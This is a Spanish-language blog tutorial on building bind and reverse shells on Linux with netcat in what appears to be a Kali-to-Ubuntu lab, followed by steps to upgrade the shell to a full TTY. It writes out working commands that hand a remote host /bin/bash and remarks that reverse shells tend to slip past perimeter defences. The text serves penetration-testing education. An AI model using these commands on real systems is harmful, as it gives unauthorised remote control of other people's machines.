---
layout: post
author: Isui Martinez
title: Bind & ReverShell Linux
---
### Shells del Sistema Operativo
El Shell (TERMINAL) es la capa más externa del sistema operativo, este incorpora un lenguaje de programación para controlar los procesos y archivos, además de interactuar con los programas. Es en términos generales el modo de interactuar con el sistema operativo, mediante comandos. Ejemplos de Shell, son la terminal de Linux, CMD, y PowerShell de Windows.

![](/images/bindandrevershellLinux/Pasted image 20240601091450.png)

### Netcat
Netcat es una herramienta que se ejecuta en la shell para crear conexiones entrantes y salientes mediante la capa de transporte del modelo TCP/IP por los protocolos TCP & UDP. Netcat ya viene instalada en Kali Linux y Parrot Security.

![](/images/bindandrevershellLinux/Pasted image 20240601092351.png)

El uso más común de Netcat es como cliente (del modelo cliente/servidor) para conectarse a un host (maquina objetivo) y puerto específico, es ahí cuando podemos establecer desde nuestro equipo una conexión remota con una maquina objetivo.

### Bind Shell
Bind Shell (Shell directa), es donde el atacante primero debe establecer una conexión hacia el objetivo (máquina victima) luego en la maquina objetivo se debe ejecutar Netcat para generar la shell. El principal problema de está opción es  debido a que la conexión es entrante y si en la red existe seguridad perimetral lo más probable es que sea bloqueada la conexión debido a estas herramientas de seguridad.
Los comandos que se ejecutaran son:
Maquina atacante (Kali) primero en modo escucha:
```
nc -lv 192.168.93.132 4444
```

La dirección IP es la de la maquina objetivo (ubuntu en esté caso), el puerto es cualquiera que no este ejecutando ningun servicio en los dos equipos, lo más comun es un puerto  del tipo efimero (puerto donde en envian solicitudes del lado del cliente), aquellos que no se ocupan.

En la maquina objetivo se coloca el siguiente comando después:

```
nc -lnp 4444 -e /bin/bash
```

Una vez establecida la conexión, se debe realizar el tratamiento de la terminal interactiva (TTY), para que funcione comodamente.
### Tratamiento de la TTY

Ingresar el comando (en nuestra terminal de atacante de Kali):
```
script /dev/null -c bash
```
Pulsar la combinación: `ctrl + z`
Escribir el comando:
```
stty raw -echo; fg
```
Pulsar `Enter` y escribir:
```
reset
```
Pulsar `Enter` y escribir:
```
reset xterm
```
Escribir:
```
export TERM=xterm
```
Ahora debemos colocar nuestra terminal en pantalla completa para trabajar más comodo en caso de comandos muy largos:
```
stty rows 30 columns 100
```

Hemos terminado el tratamiento de nuestra terminal interactiva.

### ReverseShell
Es muy parecido a realizar una BindShell, la diferencia en la conexión, en este caso la conexión se envia desde el objetivo hacia el atacante, por lo tanto como es una solicitud de salida, si llegara a existir una herramienta en la red, normalmente no lo detectaria.
Los comandos son:
El atacante coloca en modo escucha su maquina:
```
nc -lvp 4445
```

Y la maquina objetivo ejecuta la conexión reversa:
```
nc -nv 192.168.93.132 4445 -e /bin/bash
```

La dirección IP es la del atacante y el puerto en donde este se encuentra en escucha.

Luego establecer la ReverseShell se realiza nuevamete el tratamiento de la terminal interactiva, como se vio en el paso anterios (Tratamiento de la TTY).

